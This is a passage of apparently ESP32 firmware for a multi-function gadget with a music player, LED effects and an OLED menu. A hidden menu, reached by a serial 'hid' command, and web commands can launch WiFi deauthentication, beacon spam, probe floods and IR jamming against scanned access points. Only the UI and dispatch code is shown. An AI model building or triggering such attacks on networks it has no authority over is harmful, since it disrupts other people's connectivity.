        display.setCursor(SCR_W - 22, 3);
        display.print((animFrame % 4 < 2) ? "..." : "   ");
    } else {
        char t[18]; snprintf(t, sizeof(t), "FOUND %d APs", apCount);
        display.print(t);
    }
    drawBatteryDark(SCR_W-22, 2);

    if (!scanReady || apCount == 0) {
        int cx = SCR_W/2, cy = 36;
        for (int ring = 0; ring < 3; ring++) {
            int r = ((animFrame * 2) + ring * 15) % 40;
            if (r < 4) continue;
            uint16_t c = (r < 15) ? WHITE : (r < 28) ? 0x7BEF : 0x39E7;
            display.drawCircle(cx, cy, r, c);
        }
        display.fillCircle(cx, cy, 3, WHITE);
        float ang = animFrame * 0.12f;
        for (int len = 6; len < 34; len += 2) {
            int sx = cx + (int)(cosf(ang) * len);
            int sy = cy + (int)(sinf(ang) * len);
            if (sy >= 16 && sy < 54) {
                display.drawPixel(sx, sy, WHITE);
                if (len < 20) display.drawPixel(sx-1, sy, 0x7BEF);
            }
        }
        display.setTextSize(1);
        display.setTextColor(WHITE);
        display.setCursor(4, 57);
        display.print("Please wait...");
        display.display();
        return;
    }

    smTick(M_WIFI_AP_LIST, g.subSel, 0);
    int rowH = 10, baseY = 15;
    for (int i = 0; i < apCount && i < 5; i++) {
        int y = baseY + i * rowH;
        bool s = (i == g.subSel);
        if (s) { display.fillRect(0, y, SCR_W, rowH-1, WHITE); display.setTextColor(BLACK); }
        else display.setTextColor(WHITE);
        char b[18]; snprintf(b, sizeof(b), "%.14s", aps[i].ssid);
        display.setCursor(2, y+1);
        display.print(b);
        char rr[10]; snprintf(rr, sizeof(rr), "%d", aps[i].rssi);
        display.setCursor(80, y+1);
        display.print(rr);
        char chn[6]; snprintf(chn, sizeof(chn), "c%d", aps[i].channel);
        display.setCursor(108, y+1);
        display.print(chn);
    }
    display.setTextColor(WHITE);
    display.setCursor(2, SCR_H - 8);
    display.print("S:attack  B:back");
    display.display();
}

// ═══ WiFi Attack picker ═══
const char* AP_ATK[] = {"Deauth","Beacon Spam","Probe Flood"};
static void sWifiAtkMenu(){
    const int count = 3, rowH = 12, baseY = 18;
    smTick(M_WIFI_ATK, g.subSel, 0);
    display.clearDisplay();
    display.fillRect(0, 0, SCR_W, 13, WHITE);
    display.setTextColor(BLACK);
    display.setTextSize(1);
    display.setCursor(4, 3);
    char t[22];
    snprintf(t, sizeof(t), "Target: %.12s", aps[g.mainSel].ssid);
    display.print(t);

    float pillY = baseY + smSel * rowH;
    display.fillRoundRect(0, (int)roundf(pillY), SCR_W, rowH-1, 3, WHITE);
    for (int idx = 0; idx < count; idx++) {
        int y = baseY + idx * rowH;
        bool s = fabsf((float)idx - smSel) < 0.7f;
        uint16_t c = s ? BLACK : WHITE;
        display.setTextColor(c);
        display.fillTriangle(2, y+5, 5, y+2, 5, y+8, c);
        display.setCursor(12, y+3);
        display.print(AP_ATK[idx]);
    }
    display.setTextColor(WHITE);
    display.setCursor(2, SCR_H - 8);
    display.print("S: start  B: back");
    display.display();
}

static void sAttackRun(){
    display.clearDisplay(); hdrL("EXEC_ATTACK");
    for (int i = 0; i < 8; i++) {
        int x = (i*15 + animFrame*2) % SCR_W;
        int y = (animFrame * (3 + i%3)) % SCR_H;
        display.drawFastVLine(x, y, random(4, 10), WHITE);
    }
    int bx = SCR_W/2 - 38, by = 22;
    display.fillRect(bx, by, 76, 16, BLACK);
    display.drawRect(bx, by, 76, 16, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor(bx+6, by+4);
    const char* m = (atkMode == ATK_BEACON) ? "BEACON" : (atkMode == ATK_DEAUTH) ? "DEAUTH" : "PROBE";
    display.print(m);
    if ((animFrame/3) % 2 == 0) display.print("..."); else display.print("  _");
    char pk[16]; snprintf(pk, sizeof(pk), "%d pkts", atkPkts);
    display.setCursor(bx+6, by+22); display.print(pk);
    display.display();
}

static void sIrLearn(){
    display.clearDisplay(); hdrL("SCAN_IR");
    int cx = SCR_W/2, cy = 34;
    display.drawCircle(cx, cy, 15, WHITE); display.drawCircle(cx, cy, 14, WHITE);
    int scanY = cy - 14 + ((animFrame*2) % 28);
    display.drawFastHLine(cx-14, scanY, 28, WHITE);
    display.setTextSize(1); display.setTextColor(WHITE);
    display.setCursor((SCR_W - 12*6)/2, 54); display.print("WAITING CODE");
    display.display();
}
static void sIrTx(){
    display.clearDisplay(); hdrL("TRANSMITTING");
    int cx = SCR_W/2, cy = 32;
    display.fillRect(cx-2, cy, 4, 15, WHITE);
    display.fillTriangle(cx, cy-4, cx-6, cy+2, cx+6, cy+2, WHITE);
    int r1 = (animFrame * 2) % 24;
    if (r1 > 4) { display.drawCircleHelper(cx, cy-4, r1, 1, WHITE); display.drawCircleHelper(cx, cy-4, r1, 2, WHITE); }
    display.setTextSize(1);
    display.setCursor((SCR_W - 7*6)/2, 54); display.print("TX: PWR");
    display.display();
}
static void sIrJam(){
    display.clearDisplay(); hdr("JAMMING");
    int waveBase = 35;
    for (int x = 0; x < SCR_W; x++) {
        int y1 = waveBase + sinf((x + animFrame*4) * 0.1f) * 12;
        int y2 = waveBase + sinf((x - animFrame*6) * 0.15f) * 8;
        display.drawPixel(x, y1, WHITE);
        display.drawPixel(x, y2, WHITE);
    }
    display.setTextSize(1);
    display.setCursor(30, 56); display.print("TX: 940nm");
    display.display();
}

static void drawCurrent(){
    // Animation player takes precedence
    if (g.mode == M_PLAYER_ANIM && animActive) {
        animTick();
        return;
    }
    switch (g.mode) {
        case M_BOOT: sBoot(); break;
        case M_MAIN: sMain(); break;
        case M_SONGS: sSongs(); break;
        case M_PLAYER: sPlayer(); break;
        case M_PLAYER_ANIM: sPlayer(); break;   // fallback if anim not loaded
        case M_BT_MENU: sBtMenu(); break;
        case M_BT_SCAN:
            if (btScanning) sBtScan();
            else if (btConnectTarget >= 0 && (millis() - btConnectStart) < 8000 && !a2dpConnected)
                sBtConn();
            else if (a2dpConnected && (millis() - btConnectStart) < 12000)
                sBtConn();
            else if (btDevCount > 0) sBtDev();
            else sBtScan();
            break;
        case M_LED_MENU: sLedMenu(); break;
        case M_LED_FX: sLedFx(); break;
        case M_LED_BRIGHT: sLedBright(); break;
        case M_LED_WIFI: sLedWifi(); break;
        case M_FLASH_MENU: sFlash(); break;
        case M_SETTINGS: sSettings(); break;
        case M_INFO: sInfo(); break;
        case M_WIFI_FILES: sWifiFiles(); break;
        case M_HIDDEN: sHidden(); break;
        case M_WIFI_TOOLS: sWifiApList(); break;
        case M_WIFI_ATK:   sWifiAtkMenu(); break;
        case M_BT_TOOLS: sBtT(); break;
        case M_IR_MENU: sIrM(); break;
        case M_ATTACK_RUN: sAttackRun(); break;
        case M_IR_LEARN: sIrLearn(); break;
        case M_IR_TX: sIrTx(); break;
        case M_IR_JAM: sIrJam(); break;
        default: break;
    }
}

static void onMain(int ev){
    if (ev == 0) g.mainSel = (g.mainSel - 1 + 6) % 6;
    else if (ev == 1) g.mainSel = (g.mainSel + 1) % 6;
    else if (ev == 2) {
        switch (g.mainSel) {
            case 0: if (songCount) { playSong(random(0, songCount)); } break;
            case 1: g.mode = M_SONGS; g.subSel = 0; break;
            case 2: g.mode = M_BT_MENU; g.subSel = 0; break;
            case 3: g.mode = M_GAMES; g.subSel = 0; break;
            case 4: g.mode = M_LED_MENU; g.subSel = 0; break;
            case 5: g.mode = M_FLASH_MENU; g.subSel = 0; break;
        }
    }
}
static void onSongs(int ev){
    int total = songCount + 1;
    if (ev == 0) g.subSel = (g.subSel - 1 + total) % total;
    else if (ev == 1) g.subSel = (g.subSel + 1) % total;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_WIFI_FILES; startWeb(); }
        else { playSong(g.subSel - 1); }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 1; }
}
static void onPlayer(int ev){
    if (ev == 0) g.volume = min(g.volume + 5, 100);
    else if (ev == 1) g.volume = max(g.volume - 5, 0);
    else if (ev == 2) { g.isPlaying = !g.isPlaying; }
    else if (ev == 3) { stopSong(); g.mode = M_SONGS; g.subSel = g.currentSong + 1; }
}
static void onBtMenu(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2 && g.subSel == 0) {
        g.mode = M_BT_SCAN;
        btSel = 0;
        btConnectTarget = -1;
        startBtDiscovery();
    }
    else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 2; }
}
static void onLedMenu(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) {
        if (g.subSel == 0) { g.mode = M_LED_FX; g.subSel = g.curEffect; }
        else if (g.subSel == 2) g.mode = M_LED_BRIGHT;
        else if (g.subSel == 3) { g.mode = M_LED_WIFI; if (!webRunning) startWeb(); }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 4; }
}
static void onLedFx(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 4) % 4;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 4;
    else if (ev == 2) g.curEffect = g.subSel;
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 0; }
}
static void onLedBright(int ev){
    if (ev == 0) g.ledBright = min(g.ledBright + 15, 255);
    else if (ev == 1) g.ledBright = max(g.ledBright - 15, 0);
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 2; }
}
static void onLedWifi(int ev){
    if (ev == 2) { if (!webRunning) startWeb(); else stopWeb(); }
    else if (ev == 3) { g.mode = M_LED_MENU; g.subSel = 3; }
}
static void onFlash(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        switch (g.subSel) {
            case 0: flashSet(!g.flashOn); break;
            case 1: g.flashBright = (g.flashBright + 25) % 125; if (!g.flashBright) g.flashBright = 25; flashApply(); break;
            case 2: g.flashColor = (g.flashColor + 1) % 7; flashApply(); break;
            case 3: g.flashEffect = (g.flashEffect + 1) % 5; break;
            case 4: g.mode = M_MAIN; g.mainSel = 5; break;
        }
    } else if (ev == 3) { g.mode = M_MAIN; g.mainSel = 5; }
}
static void onSettings(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 5) % 5;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 5;
    else if (ev == 2) {
        if (g.subSel == 0) g.displaySleepEnabled = !g.displaySleepEnabled;
        else if (g.subSel == 1) g.ledBright = (g.ledBright + 50) % 256;
        else if (g.subSel == 3) g.mode = M_INFO;
    } else if (ev == 3) g.mode = M_MAIN;
}
static void onWifiFiles(int ev){ if (ev == 3) { if (webRunning) stopWeb(); g.mode = M_SONGS; g.subSel = 0; } }
static void onHidden(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) {
            g.mode = M_WIFI_TOOLS;
            g.subSel = 0;
            apCount = 0;
            scanReady = false;
            startAsyncScan();
        }
        else if (g.subSel == 1) { g.mode = M_BT_TOOLS; g.subSel = 0; }
        else { g.mode = M_IR_MENU; g.subSel = 0; }
    } else if (ev == 3) g.mode = M_MAIN;
}
static void onWifiTools(int ev){
    if (!scanReady) return;
    if (ev == 0 && g.subSel > 0) g.subSel--;
    else if (ev == 1 && g.subSel < apCount - 1) g.subSel++;
    else if (ev == 2 && apCount > 0) {
        g.mainSel = g.subSel;
        g.mode = M_WIFI_ATK;
        g.subSel = 0;
    }
    else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 0; }
}

static void onWifiAtk(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) { startDeauth(g.mainSel); g.mode = M_ATTACK_RUN; }
        else if (g.subSel == 1) { startBeacon(); g.mode = M_ATTACK_RUN; }
        else if (g.subSel == 2) { startProbe(); g.mode = M_ATTACK_RUN; }
    }
    else if (ev == 3) { g.mode = M_WIFI_TOOLS; g.subSel = g.mainSel; }
}

static void onBtTools(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 1; }
}
static void onIrMenu(int ev){
    if (ev == 0) g.subSel = (g.subSel - 1 + 3) % 3;
    else if (ev == 1) g.subSel = (g.subSel + 1) % 3;
    else if (ev == 2) {
        if (g.subSel == 0) g.mode = M_IR_LEARN;
        else if (g.subSel == 1) g.mode = M_IR_TX;
        else g.mode = M_IR_JAM;
    } else if (ev == 3) { g.mode = M_HIDDEN; g.subSel = 2; }
}
static void onAttack(int ev){
    if (ev == 2 || ev == 3) {
        stopAttack();
        g.mode = M_WIFI_TOOLS;
        g.subSel = g.mainSel;
    }
}
static void onGames(int ev){ if (ev == 3) { g.mode = M_MAIN; g.mainSel = 3; } }

static int pollButtons(){
    if (gSerialEv >= 0) { int e = gSerialEv; gSerialEv = -1; return e; }
    return -1;
}

static void webTask(void*){
    for (;;) {
        if (webRunning) ledServer.handleClient();
        vTaskDelay(pdMS_TO_TICKS(5));
    }
}

static void uiTask(void*){
    unsigned long lastDraw = 0;
    for (;;) {
        int ev = pollButtons();
        if (ev >= 0) wakeDisplay();
        checkSleep();

        WebCmd wc;
        while (cmdQueue && xQueueReceive(cmdQueue, &wc, 0) == pdTRUE) {
            switch (wc.type) {
                case WebCmd::PLAY: if (wc.arg >= 0 && wc.arg < songCount) playSong(wc.arg); break;
                case WebCmd::NEXT: nextSong(); break;
                case WebCmd::PREV: prevSong(); break;
                case WebCmd::STOP: stopSong(); break;
                case WebCmd::SET_EFFECT: g.curEffect = wc.arg; break;
                case WebCmd::SET_BRIGHT: g.ledBright = constrain(wc.arg, 0, 255); break;
                case WebCmd::SET_COUNT:  g.ledCount  = constrain(wc.arg, 1, LED_MAX); break;
                case WebCmd::SET_HUE:    ledHue = wc.arg & 0xFF; break;
                case WebCmd::ATK_BEACON: startBeacon(); break;
                case WebCmd::ATK_PROBE:  startProbe(); break;
                case WebCmd::ATK_DEAUTH: startDeauth(wc.arg); break;
                case WebCmd::ATK_STOP:   stopAttack(); break;
                default: break;
            }
        }

        pollScan();

        if (g.mode == M_LED_MENU || g.mode == M_LED_FX || g.mode == M_LED_WIFI ||
            g.mode == M_ATTACK_RUN || g.mode == M_IR_JAM) updateLED();

        if (ev >= 0 && ev < 4) {
            switch (g.mode) {
                case M_MAIN: onMain(ev); break;
                case M_SONGS: onSongs(ev); break;
                case M_PLAYER: onPlayer(ev); break;
                case M_PLAYER_ANIM: onPlayer(ev); break;
                case M_BT_MENU: onBtMenu(ev); break;
                case M_BT_SCAN:
                    if (btScanning) {
                        if (ev == 2 || ev == 3) stopBtDiscovery();
                    } else if (btConnectTarget >= 0 && !a2dpConnected && (millis() - btConnectStart) < 8000) {
                    } else {
                        if (ev == 0 && btSel > 0) btSel--;
                        else if (ev == 1 && btSel < btDevCount - 1) btSel++;
                        else if (ev == 2 && btDevCount > 0) btConnect(btSel);
                        else if (ev == 3) { g.mode = M_BT_MENU; g.subSel = 0; btConnectTarget = -1; }
                    }
                    break;
                case M_LED_MENU: onLedMenu(ev); break;
                case M_LED_FX: onLedFx(ev); break;
                case M_LED_BRIGHT: onLedBright(ev); break;
                case M_LED_WIFI: onLedWifi(ev); break;
                case M_FLASH_MENU: onFlash(ev); break;
                case M_SETTINGS: onSettings(ev); break;
                case M_INFO: if (ev == 3) g.mode = M_SETTINGS; break;
                case M_WIFI_FILES: onWifiFiles(ev); break;
                case M_HIDDEN: onHidden(ev); break;
                case M_WIFI_TOOLS: onWifiTools(ev); break;
                case M_WIFI_ATK:   onWifiAtk(ev); break;
                case M_BT_TOOLS: onBtTools(ev); break;
                case M_IR_MENU: onIrMenu(ev); break;
                case M_ATTACK_RUN: onAttack(ev); break;
                case M_IR_LEARN: case M_IR_TX: case M_IR_JAM:
                    if (ev == 3) { g.mode = M_IR_MENU; g.subSel = 0; } break;
                case M_GAMES: onGames(ev); break;
                default: if (ev == 3) g.mode = M_MAIN; break;
            }
        }

        unsigned long now = millis();
        if (now - lastDraw > 33) {
            lastDraw = now;
            if (!displayOff) { animFrame++; drawCurrent(); }
        }
        vTaskDelay(pdMS_TO_TICKS(15));
    }
}

static void audioTask(void*){
    for (;;) {
        if (g.isPlaying && audioMP3 && audioMP3->isRunning()) {
            if (!audioMP3->loop()) { g.isPlaying = false; nextSong(); }
        }
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

void setup(){
    Serial.begin(115200);
    delay(500);
    Serial.println("\n=== SOUMYA Gadget v9.3 ===");

    cmdQueue = xQueueCreate(16, sizeof(WebCmd));

    SPI.begin(PIN_SD_SCK, PIN_SD_MISO, PIN_SD_MOSI, PIN_SD_CS);
    if (!SD.begin(PIN_SD_CS)) Serial.println("[!] SD FAIL");
    else {
        Serial.println("[+] SD OK");
        loadSongs();
        Serial.printf("[+] %d songs\n", songCount);
        if (!SD.exists(ANIM_DIR)) SD.mkdir(ANIM_DIR);
    }

    Wire.begin(OLED_SDA, OLED_SCL);
    Wire.setClock(400000);
    if (!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR)) {
        Serial.println("[!] OLED FAIL");
        while (1) delay(1000);
    }
    display.clearDisplay(); display.display();

    checkAndFlashUpdate();

    FastLED.addLeds<WS2812B, PIN_LED_DATA,   GRB>(mainLeds, LED_MAX);
    FastLED.addLeds<WS2812B, PIN_STATUS_LED, GRB>(flashLeds, STATUS_LED_COUNT);
    FastLED.setBrightness(255);
    FastLED.clear(true);

    audioRB = new AudioOutRB();
    randomSeed(analogRead(0));
    lastActivity = millis();

    xTaskCreatePinnedToCore(audioTask, "audio", 8192,  nullptr, 2, nullptr, 1);
    xTaskCreatePinnedToCore(webTask,   "web",   8192,  nullptr, 1, nullptr, 1);
    xTaskCreatePinnedToCore(uiTask,    "ui",   12288,  nullptr, 1, nullptr, 0);
}

void loop(){
    static String cmdBuf = "";
    while (Serial.available()) {
        char c = Serial.read();
        if (c == '\n' || c == '\r') {
            cmdBuf.trim(); cmdBuf.toLowerCase();
            if      (cmdBuf == "up"   || cmdBuf == "u") gSerialEv = 0;
            else if (cmdBuf == "down" || cmdBuf == "d") gSerialEv = 1;
            else if (cmdBuf == "sel"  || cmdBuf == "s") gSerialEv = 2;
            else if (cmdBuf == "back" || cmdBuf == "b") gSerialEv = 3;
            else if (cmdBuf == "hid"  || cmdBuf == "hidden") {
                g.mode = M_HIDDEN; g.subSel = 0;
                Serial.println(">> HIDDEN menu");
            }
            else if (cmdBuf == "help" || cmdBuf == "?") {
                Serial.println("\n up/u  down/d  sel/s  back/b  hid  help\n");
            }
            cmdBuf = "";
        } else cmdBuf += c;
    }
    vTaskDelay(pdMS_TO_TICKS(20));
}
